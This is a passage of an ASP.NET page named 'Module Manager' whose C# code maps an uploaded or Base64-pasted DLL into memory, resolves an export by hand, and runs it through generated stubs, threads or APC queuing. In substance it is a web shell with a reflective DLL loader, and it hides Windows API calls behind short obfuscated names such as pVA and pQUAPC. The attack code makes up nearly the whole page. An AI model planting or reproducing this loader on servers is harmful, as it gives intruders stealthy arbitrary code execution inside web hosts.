        {
            uint ch = sec.Characteristics;
            bool ex = (ch & _SE_X) != 0;
            bool rd = (ch & _SE_R) != 0;
            bool wr = (ch & _SE_W) != 0;

            uint prot = _PRW;
            if (ex && wr) prot = _PERW;
            else if (ex && rd) prot = _PER;
            else if (ex) prot = _PER;
            else if (wr) prot = _PRW;
            else if (rd) prot = _PRO;

            uint sz = sec.VirtualSize > 0 ? sec.VirtualSize : sec.SizeOfRawData;
            if (sz == 0) continue;

            IntPtr sa = IntPtr.Add(m.Base, (int)sec.VirtualAddress);
            uint oldP;
            bool ok = pVP()(sa, (UIntPtr)sz, prot, out oldP);
            string sn = Encoding.ASCII.GetString(sec.Name).TrimEnd('\0');
            log.AppendLine("  " + sn + ": " + (ok ? "0x" + prot.ToString("X") : "failed"));
        }
    }
     //
    // CRT initialization via thread-based entry point call
    // Builds the call stub dynamically at runtime
    //
    private void InvokeEP(ModInfo m, uint reason, StringBuilder log)
    {
        byte[] stub;

        if (m.Is64)
        {
            // x64 calling convention: RCX, RDX, R8, refer to the blogpost to undestand why we change these at runtime
            stub = new byte[30];
            stub[0] = 0x48; stub[1] = 0xB9;   // mov rcx, imm64
            Array.Copy(BitConverter.GetBytes((long)m.Base), 0, stub, 2, 8);
            stub[10] = 0xBA;                     // mov edx, imm32
            Array.Copy(BitConverter.GetBytes(reason), 0, stub, 11, 4);
            stub[15] = 0x4D; stub[16] = 0x31; stub[17] = 0xC0;  // xor r8, r8
            stub[18] = 0x48; stub[19] = 0xB8;   // mov rax, imm64
            Array.Copy(BitConverter.GetBytes((long)m.EP), 0, stub, 20, 8);
            stub[28] = 0xFF; stub[29] = 0xE0;   // jmp rax
        }
        else
        {
            // x86 stdcall: push args right-to-left
            stub = new byte[20];
            stub[0] = 0x6A; stub[1] = 0x00;     // push 0
            stub[2] = 0x68;                       // push imm32 (reason)
            Array.Copy(BitConverter.GetBytes(reason), 0, stub, 3, 4);
            stub[7] = 0x68;                       // push imm32 (base)
            Array.Copy(BitConverter.GetBytes((int)m.Base), 0, stub, 8, 4);
            stub[12] = 0xB8;                      // mov eax, imm32
            Array.Copy(BitConverter.GetBytes((int)m.EP), 0, stub, 13, 4);
            stub[17] = 0xFF; stub[18] = 0xD0;    // call eax
            stub[19] = 0xC3;                      // ret
        }

        IntPtr mem = pVA()(IntPtr.Zero, (UIntPtr)stub.Length, _MC | _MR, _PERW);
        if (mem == IntPtr.Zero) { log.AppendLine("Stub alloc failed: " + pGLE()()); return; }

        try
        {
            Marshal.Copy(stub, 0, mem, stub.Length);
            pFIC()(pGCP()(), mem, (UIntPtr)stub.Length);

            uint tid;
            IntPtr ht = pCT()(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);
            if (ht == IntPtr.Zero) { log.AppendLine("Thread failed: " + pGLE()()); return; }

            uint wr = pWFSO()(ht, 10000);
            if (wr == 0)
            {
                uint ec; pGECT()(ht, out ec);
                log.AppendLine("EP returned: " + (ec != 0 ? "TRUE" : "FALSE"));
            }
            else { log.AppendLine("EP timed out"); }

            pCH()(ht);
        }
        finally
        {
            pVF()(mem, UIntPtr.Zero, _MF);
        }
    }

    IntPtr FindExport(ModInfo m, string name, StringBuilder log)
    {
        IntPtr pDos = m.Base;
        int lfanew = Marshal.ReadInt32(IntPtr.Add(pDos, 60));
        int ohOff = lfanew + 4 + Marshal.SizeOf(typeof(S_FH));
        int edOff = ohOff + (m.Is64 ? 112 : 96);

        uint eRva = (uint)Marshal.ReadInt32(IntPtr.Add(m.Base, edOff));
        if (eRva == 0) { log.AppendLine("No exports"); return IntPtr.Zero; }

        IntPtr ed = IntPtr.Add(m.Base, (int)eRva);
        S_ED exp = (S_ED)Marshal.PtrToStructure(ed, typeof(S_ED));

        log.AppendLine("Exports: " + exp.NumberOfFunctions + " functions, " + exp.NumberOfNames + " names");

        IntPtr np = IntPtr.Add(m.Base, (int)exp.AddressOfNames);
        IntPtr op = IntPtr.Add(m.Base, (int)exp.AddressOfNameOrdinals);
        IntPtr fp = IntPtr.Add(m.Base, (int)exp.AddressOfFunctions);

        for (uint i = 0; i < exp.NumberOfNames; i++)
        {
            uint nrva = (uint)Marshal.ReadInt32(IntPtr.Add(np, (int)(i * 4)));
            string en = Marshal.PtrToStringAnsi(IntPtr.Add(m.Base, (int)nrva));

            if (en == name)
            {
                ushort ord = (ushort)Marshal.ReadInt16(IntPtr.Add(op, (int)(i * 2)));
                uint frva = (uint)Marshal.ReadInt32(IntPtr.Add(fp, (int)(ord * 4)));
                IntPtr addr = IntPtr.Add(m.Base, (int)frva);
                log.AppendLine("Found '" + name + "' at 0x" + addr.ToString("X"));
                return addr;
            }
        }

        log.AppendLine("'" + name + "' not found");
        return IntPtr.Zero;
    }

    void Cleanup(ModInfo m)
    {
        if (m == null) return;

        if (m.ExTblReg && m.ExTbl != IntPtr.Zero)
        {
            pRDFT()(m.ExTbl);
            m.ExTblReg = false;
        }

        if (m.Base != IntPtr.Zero)
        {
            pVF()(m.Base, UIntPtr.Zero, _MF);
            m.Base = IntPtr.Zero;
        }
    }

    protected void btnLoadFromUpload_Click(object sender, EventArgs e)
    {
        try
        {
            if (!fileUpload.HasFile) { lblResult.Text = "No file selected"; return; }

            byte[] raw = fileUpload.FileBytes;
            string fn = txtFuncName.Text.Trim();
            string sig = ddlSignature.SelectedValue;
            string args = txtArgs.Text.Trim();

            StringBuilder log = new StringBuilder();
            log.AppendLine("=== Processing ===");
            log.AppendLine("Size: " + raw.Length + " bytes");
            log.AppendLine();

            _mod = MapModule(raw, log);
            log.AppendLine();

            log.AppendLine("=== Resolving ===");
            IntPtr pFunc = FindExport(_mod, fn, log);

            if (pFunc == IntPtr.Zero)
            {
                lblResult.Text = log.ToString() + "\n\nFunction '" + fn + "' not found";
                Cleanup(_mod);
                return;
            }

            log.AppendLine();
            log.AppendLine("=== Running ===");
            string result = RunFunc(pFunc, sig, args);
            log.AppendLine(result);

            lblResult.Text = log.ToString();
        }
        catch (Exception ex)
        {
            lblResult.Text = "Error: " + ex.Message + "\n\n" + ex.StackTrace;
        }
        finally
        {
            Cleanup(_mod);
            _mod = null;
        }
    }

    protected void btnLoadFromBase64_Click(object sender, EventArgs e)
    {
        try
        {
            string b64 = txtBase64Dll.Text.Trim();
            string fn = txtFuncName.Text.Trim();
            string sig = ddlSignature.SelectedValue;
            string args = txtArgs.Text.Trim();

            if (string.IsNullOrEmpty(b64)) { lblResult.Text = "No data provided"; return; }

            byte[] raw = Convert.FromBase64String(b64);

            StringBuilder log = new StringBuilder();
            log.AppendLine("=== Processing (Base64) ===");
            log.AppendLine("Decoded: " + raw.Length + " bytes");
            log.AppendLine();

            _mod = MapModule(raw, log);
            log.AppendLine();

            log.AppendLine("=== Resolving ===");
            IntPtr pFunc = FindExport(_mod, fn, log);

            if (pFunc == IntPtr.Zero)
            {
                lblResult.Text = log.ToString() + "\n\nFunction '" + fn + "' not found";
                Cleanup(_mod);
                return;
            }

            log.AppendLine();
            log.AppendLine("=== Running ===");
            string result = RunFunc(pFunc, sig, args);
            log.AppendLine(result);

            lblResult.Text = log.ToString();
        }
        catch (Exception ex)
        {
            lblResult.Text = "Error: " + ex.Message + "\n\n" + ex.StackTrace;
        }
        finally
        {
            Cleanup(_mod);
            _mod = null;
        }
    }

    private string RunFunc(IntPtr pFunc, string sig, string args)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("Target: 0x" + pFunc.ToString("X"));

        switch (sig)
        {
            case "void_void_cdecl":
                ((FnVV)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnVV)))();
                sb.AppendLine("Done (void)");
                break;

            case "void_void_stdcall":
                ((FnVVS)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnVVS)))();
                sb.AppendLine("Done (void)");
                break;

            case "int_void_cdecl":
                sb.AppendLine("Result: " + ((FnIV)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnIV)))());
                break;

            case "int_void_stdcall":
                sb.AppendLine("Result: " + ((FnIVS)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnIVS)))());
                break;

            case "string_void_cdecl":
                IntPtr sp = ((FnPV)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnPV)))();
                sb.AppendLine("Result: " + (sp != IntPtr.Zero ? Marshal.PtrToStringAnsi(sp) : "(null)"));
                break;

            case "int_string_cdecl":
                {
                    IntPtr ap = !string.IsNullOrEmpty(args) ? Marshal.StringToHGlobalAnsi(args) : IntPtr.Zero;
                    try { sb.AppendLine("Result: " + ((FnIP)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnIP)))(ap)); }
                    finally { if (ap != IntPtr.Zero) Marshal.FreeHGlobal(ap); }
                }
                break;

            case "void_string_cdecl":
                {
                    IntPtr ap = !string.IsNullOrEmpty(args) ? Marshal.StringToHGlobalAnsi(args) : IntPtr.Zero;
                    try { ((FnVP)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnVP)))(ap); sb.AppendLine("Done (void)"); }
                    finally { if (ap != IntPtr.Zero) Marshal.FreeHGlobal(ap); }
                }
                break;

            case "string_string_cdecl":
                {
                    IntPtr ap = !string.IsNullOrEmpty(args) ? Marshal.StringToHGlobalAnsi(args) : IntPtr.Zero;
                    try
                    {
                        IntPtr rp = ((FnPP)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnPP)))(ap);
                        sb.AppendLine("Result: " + (rp != IntPtr.Zero ? Marshal.PtrToStringAnsi(rp) : "(null)"));
                    }
                    finally { if (ap != IntPtr.Zero) Marshal.FreeHGlobal(ap); }
                }
                break;

            case "threadproc":
                sb.AppendLine("Result: " + ((FnTP)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(FnTP)))(IntPtr.Zero));
                break;

            case "thread_execute":
                sb.AppendLine("Running via thread...");
                uint ec = RunViaThread(pFunc, IntPtr.Zero, sb);
                sb.AppendLine("Exit: " + ec);
                break;

            case "apc_execute":
                sb.AppendLine("Running via APC...");
                bool ok = RunViaAPC(pFunc, sb);
                sb.AppendLine("APC: " + (ok ? "ok" : "failed"));
                break;

            default:
                sb.AppendLine("Unknown type");
                break;
        }
        return sb.ToString();
    }

    private uint RunViaThread(IntPtr func, IntPtr param, StringBuilder log)
    {
        uint tid;
        IntPtr ht = pCT()(IntPtr.Zero, UIntPtr.Zero, func, param, 0, out tid);

        if (ht == IntPtr.Zero)
        {
            log.AppendLine("Thread creation failed: " + pGLE()());
            return 0xFFFFFFFF;
        }

        log.AppendLine("Thread ID: " + tid);
        uint wr = pWFSO()(ht, 30000);
        uint ec = 0;

        if (wr == 0)
        {
            pGECT()(ht, out ec);
            log.AppendLine("Thread completed");
        }
        else { log.AppendLine("Thread timeout: " + wr); }

        pCH()(ht);
        return ec;
    }

    private bool RunViaAPC(IntPtr func, StringBuilder log)
    {
        uint tid = pGCTI()();
        IntPtr ht = pOT()(0x0010, false, tid);

        if (ht == IntPtr.Zero)
        {
            log.AppendLine("Thread open failed: " + pGLE()());
            return false;
        }

        try
        {
            uint r = pQUAPC()(func, ht, IntPtr.Zero);
            if (r == 0) { log.AppendLine("APC queue failed: " + pGLE()()); return false; }

            log.AppendLine("APC queued...");
            pSE()(0, true);
            log.AppendLine("APC done");
            return true;
        }
        finally { pCH()(ht); }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>Module Manager</title>
    <style>
        body { font-family: Consolas, monospace; background: #1a1a2e; color: #eee; padding: 20px; }
        .container { max-width: 850px; margin: 0 auto; }
        h2 { color: #e94560; }
        h3 { color: #0f3460; background: #e94560; padding: 8px; margin: 0; }
        .section { background: #16213e; margin: 15px 0; border-radius: 5px; overflow: hidden; }
        .section-content { padding: 15px; }
        input[type="text"], textarea, select {
            width: 100%; padding: 10px; margin: 5px 0;
            background: #0f3460; border: 1px solid #e94560;
            color: #eee; font-family: Consolas, monospace;
            box-sizing: border-box;
        }
        textarea { height: 100px; resize: vertical; }
        input[type="submit"] {
            background: #e94560; color: white; border: none;
            padding: 12px 24px; cursor: pointer; margin: 5px 5px 5px 0;
            font-weight: bold;
        }
        input[type="submit"]:hover { background: #ff6b6b; }
        label { color: #e94560; display: block; margin-top: 10px; font-weight: bold; }
        .result {
            background: #0a0a0a; padding: 15px; margin-top: 15px;
            border-left: 4px solid #e94560; white-space: pre-wrap;
            word-wrap: break-word; font-size: 13px;
        }
        .info { color: #888; font-size: 12px; margin-top: 5px; }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div class="container">
            <h2>Module Manager</h2>

            <div class="section">
                <h3>Configuration</h3>
                <div class="section-content">
                    <label>Function Name:</label>
                    <asp:TextBox ID="txtFuncName" runat="server" Text="Run" placeholder="e.g., Run, Execute" />
                    <div class="info">Specify the exported entry point name</div>

                    <label>Signature:</label>
                    <asp:DropDownList ID="ddlSignature" runat="server" />
                    <div class="info">Select the calling convention and return type</div>

                    <label>Arguments:</label>
                    <asp:TextBox ID="txtArgs" runat="server" placeholder="optional argument" />
                </div>
            </div>

            <div class="section">
                <h3>Upload Module</h3>
                <div class="section-content">
                    <asp:FileUpload ID="fileUpload" runat="server" />
                    <asp:Button ID="btnLoadFromUpload" runat="server" Text="Process" OnClick="btnLoadFromUpload_Click" />
                </div>
            </div>

            <div class="section">
                <h3>Base64 Input</h3>
                <div class="section-content">
                    <label>Encoded Data:</label>
                    <asp:TextBox ID="txtBase64Dll" runat="server" TextMode="MultiLine" placeholder="Paste encoded data here" />
                    <asp:Button ID="btnLoadFromBase64" runat="server" Text="Process" OnClick="btnLoadFromBase64_Click" />
                </div>
            </div>

            <div class="result">
                <asp:Label ID="lblResult" runat="server" Text="Ready." />
            </div>
        </div>
    </form>
</body>
</html>
